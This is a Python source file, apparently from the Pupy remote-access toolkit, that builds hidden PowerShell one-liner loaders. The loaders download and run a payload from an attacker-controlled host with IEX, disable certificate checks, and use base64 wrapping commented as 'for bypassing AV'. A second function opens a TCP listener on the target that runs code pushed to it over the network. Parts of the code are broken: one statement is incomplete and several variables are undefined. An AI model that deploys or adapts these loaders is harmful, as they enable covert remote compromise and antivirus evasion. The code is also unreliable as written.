#!/usr/bin/env python
# -*- coding: utf-8 -*-
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SocketServer import ThreadingMixIn

from pupylib.PupyCredentials import Credentials
from pupylib.PupyOutput import List, Success, Warn, Error

from base64 import b64encode
from ssl import wrap_socket

from string import letters
from random import choice

import tempfile
import os.path
import pupygen
import ssl
import socket

def serve_ps1_payload(display, server, conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTargetProxy=False, sslEnabled=True, nothidden=False):

    if not server:
        display(Error('Oneliners only supported from pupysh'))
        return

    url_random_one      = ''.join(choice(letters) for _ in xrange(10)) + '.txt'
    url_random_two_x86  = ''.join(choice(letters) for _ in xrange(10)) + '.txt'
    url_random_two_x64  = ''.join(choice(letters) for _ in xrange(10)) + '.txt'

    protocol             = 'http'
    ssl_cert_validation  = ''
    not_use_target_proxy = ''
    hidden               = '-w hidden '

    if nothidden:
        hidden = ''

    if sslEnabled:
        protocol            = 'https'
        ssl_cert_validation = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};'

    if not useTargetProxy:
        not_use_target_proxy = '$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();'

    powershell      = "[NOT_USE_TARGET_PROXY][SSL_CERT_VALIDATION]IEX(New-Object Net.WebClient).DownloadString('[PROTOCOL]://[LINK_IP]:[LINK_PORT]/[RANDOM]');"
    repls           = ('[NOT_USE_TARGET_PROXY]', not_use_target_proxy), \
        ('[SSL_CERT_VALIDATION]', ssl_cert_validation), \
        ('[PROTOCOL]', protocol), \
        ('[LINK_IP]', '%s' % link_ip), \
        ('[LINK_PORT]', '%s' % port)

    powershell      = reduce(lambda a, kv: a.replace(*kv), repls, powershell)

    launcher            = powershell.replace('[RANDOM]', url_random_one)
    basic_launcher      = "powershell.exe [HIDDEN]-noni -nop [CMD]".replace('[HIDDEN]', hidden)
    oneliner            = basic_launcher.replace('[CMD]', '-c %s' % repr(launcher))
    encoded_oneliner    = basic_launcher.replace('[CMD]', '-enc %s' % b64encode(launcher.encode('UTF-16LE')))

    # Compute stage1 to gain time response
    ps_template_stage1 = """
    if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')
    {{
    {0}
    }}
    else
    {{
    {1}
    }}
    """
    launcher_x64 = powershell.replace('[RANDOM]', url_random_two_x64)
    launcher_x86 = powershell.replace('[RANDOM]', url_random_two_x86)

    stage1 = ps_template_stage1.format(launcher_x64, launcher_x86)

    # For bypassing AV
    stage1 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage1))

    # generate both pupy dll to gain time response
    display(Success('Generating puppy dll to gain server reaction time. Be patient...'))

    tmpdir = tempfile.gettempdir()
    output_x86 = pupygen.generate_ps1(display, conf, output_dir=tmpdir, x86=True)
    output_x64 = pupygen.generate_ps1(display, conf, output_dir=tmpdir, x64=True)

    def cleanup():
        if os.path.isfile(output_x86):
            os.remove(output_x86)

        if os.path.isfile(output_x64):
            os.remove(output_x64)

    # For bypassing AV
    stage2_x86 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage2_x86))
    stage2_x64 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage2_x64))

    display(List([
        oneliner,
        encoded_oneliner
    ], caption=Success(
        'Copy/paste one of these one-line loader to deploy pupy without writing on the disk:')))

    display(Warn(
        'Please note that even if the target\'s system uses a proxy, '
        'this previous powershell command will not use the '
        'proxy for downloading pupy'))

def send_ps1_payload(display, conf, bind_port, target_ip, nothidden=False):

    ps1_template = """$l=[System.Net.Sockets.TcpListener][BIND_PORT];$l.start();$c=$l.AcceptTcpClient();$t=$c.GetStream();
    [byte[]]$b=0..4096|%{0};$t.Read($b, 0, 4);$c="";
    if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64'){$t.Write([System.Text.Encoding]::UTF8.GetBytes("2"),0,1);}
    else{$t.Write([System.Text.Encoding]::UTF8.GetBytes("1"),0,1);}
    while(($i=$t.Read($b,0,$b.Length)) -ne 0){ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$c=$c+$d; }
    $t.Close();$l.stop();iex $c;
    """

    main_ps1_template = """$c=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $c;"""
    hidden               = '' if nothidden else '-w hidden '
    launcher             = ps1_template.replace("[BIND_PORT]",bind_port)
    launcher             = launcher.replace('\n','').replace('    ','')
    basic_launcher       = "powershell.exe [HIDDEN]-noni -nop [CMD]".replace('[HIDDEN]', hidden)
    oneliner             = basic_launcher.replace('[CMD]', '-c \"%s\"' % launcher)
    encoded_oneliner     = basic_launcher.replace('[CMD]', '-enc %s' % b64encode(launcher.encode('UTF-16LE')))

    display(List([
            oneliner,
            encoded_oneliner,
        ], caption=Success(
            'Copy/paste one of these one-line loader to '
            'deploy pupy without writing on the disk')))

    display(Success('Generating puppy dll. Be patient...'))

    display(Success('Connecting to {0}:{1}'.format(target_ip, bind_port)))

    s = socket.create_connection((target_ip, int(bind_port)))
    s.settimeout(30)
    s.sendall("\n")

    display(Success('Receiving target architecure...'))

    version = s.recv(1024)
    ps1_encoded = None

    if version == '2':
        display(Success('Target architecture: x64'))
        with tempfile.NamedTemporaryFile
        output_x64 = pupygen.generate_ps1(display, conf, output_dir=tmpfile, x64=True)
        ps1_encoded = main_ps1_template.format(b64encode(ps1_x64))
    else:
        display(Success('Target architecture: x86'))
        output_x86 = pupygen.generate_ps1(display, conf, output_dir=tmpfile, x86=True)
        ps1_encoded = main_ps1_template.format(b64encode(ps1_x86))

    display(Success('Sending ps1 payload to {0}:{1}'.format(target_ip, bind_port)))
    s.sendall(ps1_encoded)
    s.close()

    display(Success('ps1 payload sent to target {0}:{1}'.format(target_ip, bind_port)))
